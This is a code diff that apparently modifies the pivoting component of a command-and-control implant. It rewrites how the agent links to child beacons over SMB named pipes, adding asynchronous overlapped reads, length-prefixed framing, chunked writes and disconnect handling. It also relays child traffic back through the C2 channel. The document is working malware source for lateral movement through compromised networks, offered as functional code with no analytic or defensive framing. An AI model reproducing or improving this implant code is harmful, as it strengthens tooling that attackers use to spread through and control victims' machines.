@@ -11,12 +11,30 @@ void Pivotter::operator delete(void* p) noexcept
 	MemFreeLocal(&p, sizeof(Pivotter));
 }
 
+void Pivotter::PostPivotHeaderRead(PivotData* p)
+{
+	if (!p->asyncIO || p->asyncIO->rdPending)
+		return;
+
+	p->asyncIO->rdHeader = 0;
+	ApiWin->ResetEvent(p->asyncIO->ovRead.hEvent);
+
+	DWORD nRead = 0;
+	if (ApiWin->ReadFile(p->Channel, &p->asyncIO->rdHeader, 4, &nRead, &p->asyncIO->ovRead)) {
+		ApiWin->SetEvent(p->asyncIO->ovRead.hEvent);
+		p->asyncIO->rdPending = TRUE;
+	}
+	else if (ApiWin->GetLastError() == ERROR_IO_PENDING) {
+		p->asyncIO->rdPending = TRUE;
+	}
+}
+
 void Pivotter::LinkPivotSMB(ULONG taskId, ULONG commandId, CHAR* pipename, Packer* outPacker)
 {
 	HANDLE hPipe;
 	DWORD startTickCount = ApiWin->GetTickCount() + 5000;
 	while (1) {
-		hPipe = ApiWin->CreateFileA(pipename, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_FLAG_OPEN_NO_RECALL, NULL);
+		hPipe = ApiWin->CreateFileA(pipename, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL);
 		if (INVALID_HANDLE_VALUE != hPipe)
 			break;
 
@@ -35,34 +53,75 @@ void Pivotter::LinkPivotSMB(ULONG taskId, ULONG commandId, CHAR* pipename, Packe
 
 	DWORD dwMode = PIPE_READMODE_MESSAGE;
 	if (ApiWin->SetNamedPipeHandleState(hPipe, &dwMode, NULL, NULL)) {
-		
-		if (PeekNamedPipeTime(hPipe, 5000)) {
-			LPVOID buffer      = NULL;
-			ULONG  bufferSize  = 0;
-			DWORD  readedBytes = ReadDataFromPipe(hPipe, &buffer, &bufferSize);
 
-			if (readedBytes > 4 && buffer) {
-				PivotData pivotData = { 0 };
-				pivotData.Id = taskId;
-				pivotData.Channel = hPipe;
-				pivotData.Type = PIVOT_TYPE_SMB;
+		HANDLE hTempEvent = ApiWin->CreateEventA(NULL, TRUE, FALSE, NULL);
+		if (hTempEvent) {
+			DWORD      beatLen = 0, nRead = 0;
+			OVERLAPPED ovBeat  = {};
+			ovBeat.hEvent      = hTempEvent;
 
-				this->pivots.push_back(pivotData);
-
-				outPacker->Pack32(taskId);
-				outPacker->Pack32(commandId);
-				outPacker->Pack8(pivotData.Type);
-				outPacker->Pack32(*((ULONG*)buffer));
-				outPacker->PackBytes((PBYTE)buffer + 4, readedBytes - 4);
-
-				MemFreeLocal(&buffer, bufferSize);
-
-				return;
+			if (!ApiWin->ReadFile(hPipe, &beatLen, 4, &nRead, &ovBeat)) {
+				if (ApiWin->GetLastError() == ERROR_IO_PENDING) {
+					if (ApiWin->WaitForSingleObject(hTempEvent, 5000) == WAIT_OBJECT_0)
+						ApiWin->GetOverlappedResult(hPipe, &ovBeat, &nRead, FALSE);
+					else {
+						ApiWin->CancelIo(hPipe);
+						nRead = 0;
+					}
+				} else {
+					nRead = 0;
+				}
 			}
-			else {
-				if (buffer && bufferSize)
-					MemFreeLocal(&buffer, bufferSize);
+
+			if (nRead == 4 && beatLen > 4 && beatLen <= 0x100000) {
+				LPVOID buffer = MemAllocLocal(beatLen);
+				ULONG  idx    = 0;
+				BOOL   beatOk = TRUE;
+
+				while (idx < beatLen) {
+					ovBeat        = {};
+					ovBeat.hEvent = hTempEvent;
+					ApiWin->ResetEvent(hTempEvent);
+					nRead = 0;
+					if (!ApiWin->ReadFile(hPipe, (BYTE*)buffer + idx, beatLen - idx, &nRead, &ovBeat)) {
+						if (ApiWin->GetLastError() == ERROR_IO_PENDING)
+							ApiWin->GetOverlappedResult(hPipe, &ovBeat, &nRead, TRUE);
+						else { beatOk = FALSE; break; }
+					}
+					idx += nRead;
+				}
+
+				if (beatOk && idx == beatLen) {
+					SMBAsyncIO* asyncIO = (SMBAsyncIO*)MemAllocLocal(sizeof(SMBAsyncIO));
+					if (asyncIO) {
+						memset(asyncIO, 0, sizeof(SMBAsyncIO));
+						asyncIO->ovRead.hEvent = ApiWin->CreateEventA(NULL, TRUE, FALSE, NULL);
+						asyncIO->hWriteEvent   = ApiWin->CreateEventA(NULL, TRUE, FALSE, NULL);
+
+						PivotData pivotData = { 0 };
+						pivotData.Id      = taskId;
+						pivotData.Channel = hPipe;
+						pivotData.Type    = PIVOT_TYPE_SMB;
+						pivotData.asyncIO = asyncIO;
+
+						this->pivots.push_back(pivotData);
+
+						PostPivotHeaderRead(&this->pivots[this->pivots.size() - 1]);
+
+						outPacker->Pack32(taskId);
+						outPacker->Pack32(commandId);
+						outPacker->Pack8(PIVOT_TYPE_SMB);
+						outPacker->Pack32(*((ULONG*)buffer));
+						outPacker->PackBytes((PBYTE)buffer + 4, idx - 4);
+
+						MemFreeLocal(&buffer, beatLen);
+						ApiNt->NtClose(hTempEvent);
+						return;
+					}
+				}
+				MemFreeLocal(&buffer, beatLen);
 			}
+			ApiNt->NtClose(hTempEvent);
 		}
 	}
 
@@ -181,8 +240,15 @@ void Pivotter::UnlinkPivot(ULONG taskId, ULONG commandId, ULONG pivotId, Packer*
 		if (pivotData->Id == pivotId) {
 			if (pivotData->Type == PIVOT_TYPE_SMB) {
 				if (pivotData->Channel) {
+					if (pivotData->asyncIO && pivotData->asyncIO->rdPending)
+						ApiWin->CancelIo(pivotData->Channel);
 					ApiWin->DisconnectNamedPipe(pivotData->Channel);
 					ApiNt->NtClose(pivotData->Channel);
+				}
+				if (pivotData->asyncIO) {
+					if (pivotData->asyncIO->ovRead.hEvent) ApiNt->NtClose(pivotData->asyncIO->ovRead.hEvent);
+					if (pivotData->asyncIO->hWriteEvent)   ApiNt->NtClose(pivotData->asyncIO->hWriteEvent);
+					MemFreeLocal((LPVOID*)&pivotData->asyncIO, sizeof(SMBAsyncIO));
 				}
 			}
 			else if (pivotData->Type == PIVOT_TYPE_TCP) {
@@ -212,8 +278,41 @@ void Pivotter::WritePivot(ULONG pivotId, BYTE* data, ULONG size)
 		pivotData = &(this->pivots[i]);
 		if (pivotData->Id == pivotId) {
 			if (pivotData->Type == PIVOT_TYPE_SMB) {
-				if (pivotData->Channel)
-					WriteDataToPipe(pivotData->Channel, data, size);
+				if (pivotData->Channel && pivotData->asyncIO) {
+
+					OVERLAPPED ovWrite = {};
+					ovWrite.hEvent     = pivotData->asyncIO->hWriteEvent;
+					DWORD nWritten     = 0;
+
+					ApiWin->ResetEvent(pivotData->asyncIO->hWriteEvent);
+					if (!ApiWin->WriteFile(pivotData->Channel, &size, 4, &nWritten, &ovWrite)) {
+						if (ApiWin->GetLastError() == ERROR_IO_PENDING)
+							ApiWin->GetOverlappedResult(pivotData->Channel, &ovWrite, &nWritten, TRUE);
+						else
+							goto _smb_write_done;
+					}
+
+					{
+						DWORD index = 0;
+						while (index < size) {
+							DWORD chunkSize = (size - index > 0x2000) ? 0x2000 : size - index;
+							nWritten       = 0;
+							ovWrite        = {};
+							ovWrite.hEvent = pivotData->asyncIO->hWriteEvent;
+							ApiWin->ResetEvent(pivotData->asyncIO->hWriteEvent);
+							if (!ApiWin->WriteFile(pivotData->Channel, data + index, chunkSize, &nWritten, &ovWrite)) {
+								if (ApiWin->GetLastError() == ERROR_IO_PENDING)
+									ApiWin->GetOverlappedResult(pivotData->Channel, &ovWrite, &nWritten, TRUE);
+								else break;
+							}
+							index += nWritten;
+						}
+					}
+
+					this->pendingSMBChildReply  = TRUE;
+					this->lastSMBChildWriteTick = ApiWin->GetTickCount();
+				}
+				_smb_write_done:;
 			}
 			else if (pivotData->Type == PIVOT_TYPE_TCP) {
 				timeval timeout = { 0, 100 };
@@ -232,6 +331,7 @@ void Pivotter::WritePivot(ULONG pivotId, BYTE* data, ULONG size)
 						ApiWin->send(pivotData->Socket, (const char*)data, size, 0);
 				}
 			}
+			this->pendingWrite = TRUE;
 			break;
 		}
 	}
@@ -240,44 +340,92 @@ void Pivotter::WritePivot(ULONG pivotId, BYTE* data, ULONG size)
 
 void Pivotter::ProcessPivots(Packer* packer)
 {
-	if ( !this->pivots.size() )
+	if ( !this->pivots.size() ) {
+		this->pendingWrite = FALSE;
 		return;
+	}
 
+	BOOL dataRead = FALSE;
 	PivotData* pivotData = NULL;
 	for (int i = 0; i < this->pivots.size(); i++) {
 		pivotData = &this->pivots[i];
 
 		if (pivotData->Type == PIVOT_TYPE_SMB) {
 
-			if (pivotData->Channel) {
-				if (PeekNamedPipeTime(pivotData->Channel, 0)) {
-					LPVOID mallocBuffer = NULL;
-					ULONG  mallocSize   = 0;
-					DWORD  readedBytes  = ReadDataFromPipe(pivotData->Channel, &mallocBuffer, &mallocSize);
-					if (readedBytes != -1) {
+			if (pivotData->Channel && pivotData->asyncIO) {
+
+				PostPivotHeaderRead(pivotData);
+
+				BOOL pivotBroken = !pivotData->asyncIO->rdPending;
+
+				while (!pivotBroken) {
+					DWORD nRead = 0;
+					if (!ApiWin->GetOverlappedResult(pivotData->Channel, &pivotData->asyncIO->ovRead, &nRead, FALSE)) {
+						if (ApiWin->GetLastError() == ERROR_IO_INCOMPLETE)
+							break;
+						pivotBroken = TRUE;
+						break;
+					}
+
+					pivotData->asyncIO->rdPending = FALSE;
+					ULONG msgLen = pivotData->asyncIO->rdHeader;
+
+					if (msgLen == 0 || msgLen > 0x1000000) { pivotBroken = TRUE; break; }
+
+					LPVOID mallocBuffer = MemAllocLocal(msgLen);
+					ULONG  mallocSize   = msgLen;
+					ULONG  idx          = 0;
+					BOOL   bodyOk       = TRUE;
+
+					while (idx < msgLen) {
+						OVERLAPPED ovBody = {};
+						ovBody.hEvent     = pivotData->asyncIO->ovRead.hEvent;
+						ApiWin->ResetEvent(pivotData->asyncIO->ovRead.hEvent);
+						nRead = 0;
+						if (!ApiWin->ReadFile(pivotData->Channel, (BYTE*)mallocBuffer + idx, msgLen - idx, &nRead, &ovBody)) {
+							if (ApiWin->GetLastError() == ERROR_IO_PENDING)
+								ApiWin->GetOverlappedResult(pivotData->Channel, &ovBody, &nRead, TRUE);
+							else { bodyOk = FALSE; break; }
+						}
+						idx += nRead;
+					}
+
+					if (bodyOk && idx == msgLen) {
 						packer->Pack32(0);
 						packer->Pack32(COMMAND_PIVOT_EXEC);
 						packer->Pack32(pivotData->Id);
-						packer->PackBytes((PBYTE)mallocBuffer, readedBytes);
+						packer->PackBytes((PBYTE)mallocBuffer, idx);
+						dataRead = TRUE;
+						this->pendingSMBChildReply = FALSE;
+					} else {
+						pivotBroken = TRUE;
 					}
-					if(mallocBuffer && mallocSize)
-						MemFreeLocal(&mallocBuffer, readedBytes);
+
+					MemFreeLocal(&mallocBuffer, mallocSize);
+
+					if (pivotBroken) break;
+
+					PostPivotHeaderRead(pivotData);
+					if (!pivotData->asyncIO->rdPending) { pivotBroken = TRUE; break; }
+
+					if (ApiWin->WaitForSingleObject(pivotData->asyncIO->ovRead.hEvent, 0) != WAIT_OBJECT_0)
+						break;
 				}
-				else {
-					if (TEB->LastErrorValue == ERROR_BROKEN_PIPE) {
-						TEB->LastErrorValue = 0;
 
-						ApiWin->DisconnectNamedPipe(pivotData->Channel);
-						ApiNt->NtClose(pivotData->Channel);
+				if (pivotBroken) {
+					ApiWin->CancelIo(pivotData->Channel);
+					if (pivotData->asyncIO->ovRead.hEvent)  ApiNt->NtClose(pivotData->asyncIO->ovRead.hEvent);
+					if (pivotData->asyncIO->hWriteEvent)    ApiNt->NtClose(pivotData->asyncIO->hWriteEvent);
+					ApiNt->NtClose(pivotData->Channel);
+					MemFreeLocal((LPVOID*)&pivotData->asyncIO, sizeof(SMBAsyncIO));
 
-						packer->Pack32(0);
-						packer->Pack32(COMMAND_UNLINK);
-						packer->Pack32(pivotData->Id);
-						packer->Pack8(PIVOT_TYPE_DISCONNECT);
+					packer->Pack32(0);
+					packer->Pack32(COMMAND_UNLINK);
+					packer->Pack32(pivotData->Id);
+					packer->Pack8(PIVOT_TYPE_DISCONNECT);
 
-						this->pivots.remove(i);
-						i--;
-					}
+					this->pivots.remove(i);
+					i--;
 				}
 			}
 		}
@@ -299,6 +447,7 @@ void Pivotter::ProcessPivots(Packer* packer)
 							packer->Pack32(COMMAND_PIVOT_EXEC);
 							packer->Pack32(pivotData->Id);
 							packer->PackBytes((BYTE*)buffer, readed);
+							dataRead = TRUE;
 						}
 						if (buffer && dataLength)
 							MemFreeLocal((LPVOID*)&buffer, dataLength);
@@ -319,5 +468,9 @@ void Pivotter::ProcessPivots(Packer* packer)
 			}
 		}
 	}
+
+	if (dataRead || !this->pivots.size())
+		this->pendingWrite = FALSE;
+
 	pivotData = NULL;
 }
